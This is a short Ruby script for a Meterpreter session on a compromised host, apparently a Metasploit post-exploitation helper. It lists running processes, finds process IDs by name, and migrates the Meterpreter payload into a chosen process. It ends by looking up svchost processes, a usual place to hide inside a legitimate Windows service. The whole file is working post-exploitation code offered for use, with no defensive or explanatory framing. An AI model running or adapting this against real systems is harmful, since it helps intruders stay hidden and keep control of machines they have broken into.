@client = client
def met_migrate(pid_to_migrate)
	migrate_status = true
	begin
		print_status("Migrating in to #{pid_to_migrate}")
		@client.core.migrate(pid_to_migrate)
		print_status("Migration was successful")
	rescue::Exception => e
		print_error(e)
		migrate_status = false
	end
	return migrate_status
end

def deg_procs
	@client.sys.process.processes.each do |p|
		print_status("#{p['name']}: #{p['pid']}")
	end
end
def find_pids(name)
	proc_pid = []
	@client.sys.process.get_processes.each do |proc|
		if proc['name'].downcase =~ /#{name}/i
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end
puts find_pids("svchost").inspect